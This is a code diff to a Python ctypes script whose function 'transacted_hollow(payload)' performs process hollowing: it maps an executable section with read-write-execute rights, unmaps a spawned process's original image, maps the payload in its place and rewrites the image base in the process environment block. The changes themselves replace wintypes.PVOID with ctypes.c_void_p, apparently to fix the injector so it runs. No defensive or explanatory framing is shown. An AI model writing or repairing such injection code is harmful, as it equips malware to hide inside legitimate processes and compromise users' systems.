@@ -30,7 +30,7 @@ class CONTEXT(ctypes.Structure):
     _fields_=[("P1Home",ctypes.c_uint64),("P2Home",ctypes.c_uint64),("P3Home",ctypes.c_uint64),("P4Home",ctypes.c_uint64),("P5Home",ctypes.c_uint64),("P6Home",ctypes.c_uint64),("ContextFlags",ctypes.c_uint32),("MxCsr",ctypes.c_uint32),("SegCs",ctypes.c_uint16),("SegDs",ctypes.c_uint16),("SegEs",ctypes.c_uint16),("SegFs",ctypes.c_uint16),("SegGs",ctypes.c_uint16),("SegSs",ctypes.c_uint16),("EFlags",ctypes.c_uint32),("Dr0",ctypes.c_uint64),("Dr1",ctypes.c_uint64),("Dr2",ctypes.c_uint64),("Dr3",ctypes.c_uint64),("Dr6",ctypes.c_uint64),("Dr7",ctypes.c_uint64),("Rax",ctypes.c_uint64),("Rcx",ctypes.c_uint64),("Rdx",ctypes.c_uint64),("Rbx",ctypes.c_uint64),("Rsp",ctypes.c_uint64),("Rbp",ctypes.c_uint64),("Rsi",ctypes.c_uint64),("Rdi",ctypes.c_uint64),("R8",ctypes.c_uint64),("R9",ctypes.c_uint64),("R10",ctypes.c_uint64),("R11",ctypes.c_uint64),("R12",ctypes.c_uint64),("R13",ctypes.c_uint64),("R14",ctypes.c_uint64),("R15",ctypes.c_uint64),("Rip",ctypes.c_uint64)]
 
 class PROCESS_BASIC_INFORMATION(ctypes.Structure):
-    _fields_=[("Reserved1",wintypes.PVOID),("PebBaseAddress",wintypes.PVOID),("Reserved2",wintypes.PVOID*2),("UniqueProcessId",wintypes.ULONG_PTR),("Reserved3",wintypes.PVOID)]
+    _fields_=[("Reserved1",ctypes.c_void_p),("PebBaseAddress",ctypes.c_void_p),("Reserved2",ctypes.c_void_p*2),("UniqueProcessId",ctypes.c_void_p),("Reserved3",ctypes.c_void_p)]
 
 ProcessBasicInformation=0
 PEB_IMAGEBASE_OFFSET=0x10
@@ -44,11 +44,11 @@ NtCreateSection.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.ACCESS_MASK,c
 NtCreateSection.restype=ctypes.c_ulong
 
 NtMapViewOfSection=n.NtMapViewOfSection
-NtMapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.HANDLE,ctypes.POINTER(wintypes.PVOID),ctypes.c_ulonglong,ctypes.c_size_t,ctypes.POINTER(ctypes.c_uint64),ctypes.POINTER(ctypes.c_size_t),ctypes.c_uint32,ctypes.c_ulong,ctypes.c_ulong]
+NtMapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.HANDLE,ctypes.POINTER(ctypes.c_void_p),ctypes.c_ulonglong,ctypes.c_size_t,ctypes.POINTER(ctypes.c_uint64),ctypes.POINTER(ctypes.c_size_t),ctypes.c_uint32,ctypes.c_ulong,ctypes.c_ulong]
 NtMapViewOfSection.restype=ctypes.c_ulong
 
 NtUnmapViewOfSection=n.NtUnmapViewOfSection
-NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.PVOID]
+NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,ctypes.c_void_p]
 NtUnmapViewOfSection.restype=ctypes.c_ulong
 
 NtQueryInformationProcess=n.NtQueryInformationProcess
@@ -129,7 +129,7 @@ def transacted_hollow(payload):
         return False
     
     # Map section into current process
-    localBase=wintypes.PVOID()
+    localBase=ctypes.c_void_p()
     viewSize=ctypes.c_size_t(0)
     status=NtMapViewOfSection(hSection,ctypes.windll.kernel32.GetCurrentProcess(),ctypes.byref(localBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
     if status!=0:
@@ -160,15 +160,15 @@ def transacted_hollow(payload):
         return False
     
     # Read original image base
-    originalBase=wintypes.PVOID()
+    originalBase=ctypes.c_void_p()
     bytesRead=ctypes.c_size_t()
-    ReadProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(originalBase),ctypes.sizeof(wintypes.PVOID),ctypes.byref(bytesRead))
+    ReadProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
     
     # Unmap original image
     NtUnmapViewOfSection(pi.hProcess,originalBase)
     
     # Map our section into target process
-    remoteBase=wintypes.PVOID()
+    remoteBase=ctypes.c_void_p()
     viewSize=ctypes.c_size_t(0)
     status=NtMapViewOfSection(hSection,pi.hProcess,ctypes.byref(remoteBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
     if status!=0:
@@ -180,7 +180,7 @@ def transacted_hollow(payload):
         return False
     
     # Update PEB image base
-    WriteProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(remoteBase),ctypes.sizeof(wintypes.PVOID),None)
+    WriteProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
     
     # Get entry point from PE headers
     dosHeader=ctypes.create_string_buffer(64)
